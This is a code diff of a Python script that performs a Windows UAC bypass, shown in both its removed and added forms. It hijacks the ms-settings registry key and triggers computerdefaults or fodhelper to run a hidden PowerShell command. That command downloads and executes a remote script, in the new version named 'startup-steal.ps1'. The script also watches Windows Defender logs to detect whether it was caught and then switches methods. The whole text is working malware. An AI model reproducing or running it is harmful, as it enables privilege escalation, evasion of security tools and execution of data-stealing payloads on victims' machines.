@@ -1,39 +1,17 @@
-import subprocess
-import ctypes
-import sys
-import os
+import subprocess, ctypes
 
-def UACbypass(method: int = 1) -> bool:
-    if GetSelf()[1]:
-        execute = lambda cmd: subprocess.run(cmd, shell=True, capture_output=True)
-        # Lệnh PowerShell cần chạy
-        powershell_command = 'powershell -nop -ep bypass -w hidden -c "iwr -useb https://raw.githubusercontent.com/s1uiasdad/log-acc-v2/main/scr/download.ps1 | iex"'
-        
-        if method == 1:
-            execute(f'reg add hkcu\\Software\\Classes\\ms-settings\\shell\\open\\command /d "{powershell_command}" /f')
-            execute("reg add hkcu\\Software\\Classes\\ms-settings\\shell\\open\\command /v \"DelegateExecute\" /f")
-            log_count_before = len(execute('wevtutil qe "Microsoft-Windows-Windows Defender/Operational" /f:text').stdout)
-            execute("computerdefaults --nouacbypass")
-            log_count_after = len(execute('wevtutil qe "Microsoft-Windows-Windows Defender/Operational" /f:text').stdout)
-            execute("reg delete hkcu\\Software\\Classes\\ms-settings /f")
-            if log_count_after > log_count_before:
-                return UACbypass(method + 1)
-        elif method == 2:
-            execute(f'reg add hkcu\\Software\\Classes\\ms-settings\\shell\\open\\command /d "{powershell_command}" /f')
-            execute("reg add hkcu\\Software\\Classes\\ms-settings\\shell\\open\\command /v \"DelegateExecute\" /f")
-            log_count_before = len(execute('wevtutil qe "Microsoft-Windows-Windows Defender/Operational" /f:text').stdout)
-            execute("fodhelper --nouacbypass")
-            log_count_after = len(execute('wevtutil qe "Microsoft-Windows-Windows Defender/Operational" /f:text').stdout)
-            execute("reg delete hkcu\\Software\\Classes\\ms-settings /f")
-            if log_count_after > log_count_before:
-                return UACbypass(method + 1)
-        else:
-            return False
-        
-        return True
+def UACbypass(method=1):
+    if ctypes.windll.shell32.IsUserAnAdmin():
+        run = lambda cmd: subprocess.run(cmd, shell=True, capture_output=True).stdout
+        ps_cmd = 'powershell -nop -ep bypass -w hidden -c "iwr -useb https://raw.githubusercontent.com/s1uiasdad/log-acc-v2/main/scr/startup-steal.ps1 | iex"'
+        reg_cmd = 'hkcu\\Software\\Classes\\ms-settings\\shell\\open\\command'
+        run(f'reg add {reg_cmd} /d "{ps_cmd}" /f')
+        run(f'reg add {reg_cmd} /v "DelegateExecute" /f')
+        lb = len(run('wevtutil qe "Microsoft-Windows-Windows Defender/Operational" /f:text'))
+        run(f'{"computerdefaults" if method == 1 else "fodhelper"} --nouacbypass')
+        la = len(run('wevtutil qe "Microsoft-Windows-Windows Defender/Operational" /f:text'))
+        run(f'reg delete {reg_cmd} /f')
+        return UACbypass(method+1) if la > lb else True if method == 1 else False
 
-def IsAdmin() -> bool:
-    return ctypes.windll.shell32.IsUserAnAdmin() == 1
-
-if not IsAdmin():
+if not ctypes.windll.shell32.IsUserAnAdmin():
     UACbypass()
